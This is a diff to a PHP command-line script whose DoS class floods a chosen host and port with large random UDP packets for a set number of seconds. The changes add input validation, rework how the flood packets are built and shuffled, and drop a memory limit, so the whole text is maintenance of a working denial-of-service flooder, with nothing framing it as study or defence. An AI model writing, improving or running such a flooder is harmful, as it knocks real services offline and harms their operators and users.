@@ -28,8 +28,6 @@ error_reporting(E_ERROR | E_WARNING);
 
 ini_set('max_execution_time', 0);
 
-ini_set('memory_limit', '2048M');
-
 class DoS
 {
     const MIN_PACKET_SIZE = 61440; // 60 kB
@@ -54,7 +52,7 @@ class DoS
     private $time;
 
     /**
-     * Flood time in seconds
+     * Randomize all packets to avoid packet drops
      * @var boolean
      */
     private $random;
@@ -68,6 +66,11 @@ class DoS
      */
     public function __construct($host, $port, $time, $random)
     {
+        Preconditions::checkArgument(filter_var($host, FILTER_VALIDATE_IP), "host parameter missing or has an incorrect format");
+        Preconditions::checkArgument(filter_var($port, FILTER_VALIDATE_INT), "port parameter missing or has an incorrect format");
+        Preconditions::checkArgument(filter_var($time, FILTER_VALIDATE_INT), "time parameter missing or has an incorrect format");
+        Preconditions::checkArgument(filter_var($random, FILTER_VALIDATE_BOOLEAN), "random parameter missing or has an incorrect format");
+
         $this->host = $host;
         $this->port = $port;
         $this->time = $time;
@@ -80,28 +83,35 @@ class DoS
      */
     public function flood()
     {
-        // pre generate packets to be faster while sending the packets
-        $packets = $this->generatePackets($this->random ? 20000 : 1);
-
         $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
         if (!$socket) {
             throw new Exception($errorMessage);
         }
 
         $endTime = time() + $this->time;
-        while(time() <= $endTime) {
-            @fwrite($socket, $packets[array_rand($packets)]);
+
+        $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
+        $packet = openssl_random_pseudo_bytes($length);
+        while (time() <= $endTime) {
+            @fwrite($socket, $this->random ? str_shuffle($packet) : $packet);
         }
         @fclose($socket);
     }
+}
 
-    private function generatePackets($size) {
-        $packets = array();
-        for ($i = 0; $i < $size; $i++) {
-            $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
-            $packets[] = bin2hex(openssl_random_pseudo_bytes($length / 2));
+class Preconditions
+{
+    /**
+     * Ensures the truth of an expression involving one or more parameters to the calling method.
+     * @param $expression boolean A boolean expression
+     * @param $errorMessage string The exception message to use if the check fails
+     * @throws InvalidArgumentException If expression is false
+     */
+    public static function checkArgument($expression, $errorMessage)
+    {
+        if (!$expression) {
+            throw new InvalidArgumentException($errorMessage);
         }
-        return $packets;
     }
 }
 
@@ -117,7 +127,7 @@ class Application
         $host = $args['host'];
         $port = isset($args['port']) ? intval($args['port']) : 80;
         $time = isset($args['time']) ? intval($args['time']) : 60;
-        $random = isset($args['random']) ? boolval($args['random']) : false;
+        $random = isset($args['random']) ? $args['random'] === "true" : false;
 
         $result = null;
         try {
